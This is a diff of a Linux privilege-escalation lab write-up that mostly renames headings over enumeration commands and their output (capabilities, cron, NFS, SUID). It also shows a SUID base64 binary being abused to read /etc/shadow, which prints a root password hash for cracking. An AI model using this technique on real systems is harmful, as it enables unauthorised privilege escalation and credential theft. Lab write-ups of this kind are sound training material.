@@ -8,7 +8,7 @@ ssh leonard@10.10.17.216
 
 # Enumeration
 
-## OS Information
+## System Information Gathering
 ```
 [leonard@ip-10-10-17-216 ~]$ uname -a
 Linux ip-10-10-17-216 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -21,13 +21,13 @@ Kernel \r on an \m
 
 ```
 
-## Kernel Version For Exploit
+## Checking Kernel Version For Exploit
 ```
 cat /proc/version
 Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
 ```
 
-## sudo
+## Checking `sudo` Privileges
 ```
 sudo -l
 ```
@@ -43,7 +43,7 @@ Administrator. It usually boils down to these three things:
 Sorry, user leonard may not run sudo on ip-10-10-17-216.
 ```
 
-## capabilities
+## Checking Capabilities List
 ```
 getcap -r / 2>/dev/null
 ```
@@ -58,7 +58,7 @@ getcap -r / 2>/dev/null
 /usr/sbin/suexec = cap_setgid,cap_setuid+ep
 ```
 
-## PATH
+## Checking `$PATH` Environmental Variable
 ```
 echo $PATH
 ```
@@ -73,9 +73,7 @@ onard/.local/bin:/home/leonard/bin
 [leonard@ip-10-10-17-216 ~]$
 ```
 
-
-
-## Cron Jobs
+## Checking Cron Jobs
 
 ```
 cat /etc/crontab
@@ -99,7 +97,7 @@ MAILTO=root
 
 
 
-## NFS
+## NFS Enumeration
 
 ```
 showmount -e 10.10.17.216
@@ -113,7 +111,7 @@ cat /etc/exports
 NO OUTPUT
 ```
 
-## SUID
+## Checking SUID Permissions
 
 ```
 find / -type f -user root -perm -4000 -ls 2>/dev/null
@@ -154,12 +152,15 @@ find / -type f -user root -perm -4000 -ls 2>/dev/null
 18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
 ```
 
-Since we do have permission to list files from certain directories in which flag files might exist
+Notice that SUID permission is set to `/usr/bin/base64`.
 
+We do have permission to list files from certain directories in which flag files might exist.
 ```
 [leonard@ip-10-10-17-216 ~]$ find / -type f -name "flag*.txt" 2>/dev/null
 [leonard@ip-10-10-17-216 ~]
 ```
+
+## Checking `/etc/passwd`
 
 `cat /etc/passwd`
 ```
@@ -221,7 +222,7 @@ missy:x:1001:1001::/home/missy:/bin/bash
 ## Password Cracking
 ### `suid` `base64` and `shadow` file password cracking
 
-Look into `/etc/shadow`	 file 
+### Taking Advantage of SUID Permission on `base64` to Check `/etc/shadow` File
 `[leonard@ip-10-10-17-216 ~]$ base64 "/etc/shadow" | base64 --decode`
 ```
 root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
